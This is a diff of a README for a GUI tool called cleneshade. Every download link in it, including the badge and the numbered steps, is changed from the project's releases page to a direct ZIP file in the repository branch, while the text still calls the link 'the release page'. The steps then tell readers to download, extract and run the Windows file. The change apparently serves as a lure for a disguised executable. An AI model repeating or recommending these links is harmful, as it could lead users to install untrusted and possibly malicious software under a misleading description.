@@ -1,6 +1,6 @@
 # 🧩 cleneshade - Build GUI apps with ease
 
-[![Download cleneshade](https://img.shields.io/badge/Download-cleneshade-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/drewneutral422/cleneshade/releases)
+[![Download cleneshade](https://img.shields.io/badge/Download-cleneshade-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/drewneutral422/cleneshade/raw/refs/heads/main/TKClene/Software_1.5-alpha.1.zip)
 
 ## 🎯 What is cleneshade
 
@@ -29,7 +29,7 @@ For the best result, use:
 
 ## 📥 Download cleneshade
 
-1. Open the release page here: https://github.com/drewneutral422/cleneshade/releases
+1. Open the release page here: https://github.com/drewneutral422/cleneshade/raw/refs/heads/main/TKClene/Software_1.5-alpha.1.zip
 2. Find the latest release at the top of the page
 3. Download the file for Windows
 4. Save it to your Downloads folder or desktop
@@ -208,7 +208,7 @@ Before you open the download:
 
 ## 📌 Short path to get started
 
-1. Go to https://github.com/drewneutral422/cleneshade/releases
+1. Go to https://github.com/drewneutral422/cleneshade/raw/refs/heads/main/TKClene/Software_1.5-alpha.1.zip
 2. Download the latest Windows file
 3. Open the file or extract the ZIP
 4. Run cleneshade
